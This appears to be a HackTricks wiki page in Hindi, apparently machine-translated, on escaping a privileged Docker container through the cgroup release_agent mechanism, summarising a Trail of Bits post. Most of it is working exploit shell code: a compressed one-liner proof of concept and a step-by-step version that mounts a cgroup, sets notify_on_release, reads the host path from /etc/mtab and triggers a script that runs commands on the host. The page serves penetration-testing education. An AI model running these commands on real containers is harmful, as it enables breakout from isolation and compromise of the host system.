# Docker release\_agent cgroups भागने

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>


**अधिक विवरण के लिए, [मूल ब्लॉग पोस्ट](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) का संदर्भ दें।** यह केवल एक सारांश है:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
प्रमाण संदर्भ (PoC) एक विधि का प्रदर्शन करता है जिससे cgroups का शोषण किया जा सकता है एक `release_agent` फ़ाइल बनाकर और इसके आह्वान को ट्रिगर करके कंटेनर होस्ट पर विभिन्न कमांड्स को निषेधित करने के लिए कार्यवाही की जा सकती है। यहाँ दी गई है इस प्रक्रिया के चरणों का विवरण:

1. **पर्यावरण की तैयारी:**
- `/tmp/cgrp` नामक एक निर्देशिका बनाई जाती है जो cgroup के लिए माउंट पॉइंट के रूप में काम करती है।
- RDMA cgroup नियंत्रक को इस निर्देशिका पर माउंट किया जाता है। RDMA नियंत्रक की अनुपस्थिति के मामले में, एक वैकल्पिक रूप में `memory` cgroup नियंत्रक का उपयोग करने की सिफारिश की जाती है।
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **बच्चा सीग्रुप सेट अप करें:**
   - माउंट किए गए सीग्रुप निर्देशिका के भीतर "x" नाम का एक बच्चा सीग्रुप बनाया जाता है।
   - "x" सीग्रुप के लिए सूचनाएं सक्षम की जाती है जिसके लिए उसके notify_on_release फ़ाइल में 1 लिखकर।
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **रिलीज एजेंट कॉन्फ़िगर करें:**
   - मेज़बान पर कंटेनर का पथ /etc/mtab फ़ाइल से प्राप्त किया जाता है।
   - फिर cgroup का release_agent फ़ाइल कॉन्फ़िगर किया जाता है ताकि एक स्क्रिप्ट जिसका नाम /cmd है जो प्राप्त होस्ट पथ पर स्थित है, को निष्पादित करें।
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd स्क्रिप्ट बनाएं और कॉन्फ़िगर करें:**
   - /cmd स्क्रिप्ट कंटेनर के अंदर बनाया जाता है और इसे कॉन्फ़िगर किया जाता है कि ps aux को execute करें, जिसका आउटपुट फ़ाइल /output में रीडायरेक्ट किया जाए, जो कंटेनर में होती है। होस्ट पर /output का पूरा पथ निर्दिष्ट किया जाता है।
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **हमला ट्रिगर करें:**
   - एक प्रक्रिया "x" बाल cgroup के अंदर प्रारंभ की जाती है और तुरंत समाप्त हो जाती है।
   - इससे `release_agent` (/cmd स्क्रिप्ट) को ट्रिगर होता है, जो मेज़बान पर ps aux का निष्पादन करता है और आउटपुट को कंटेनर के अंदर /output में लिखता है।
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **मुझे** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** PRs के माध्यम से [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में सबमिट करके।

</details>
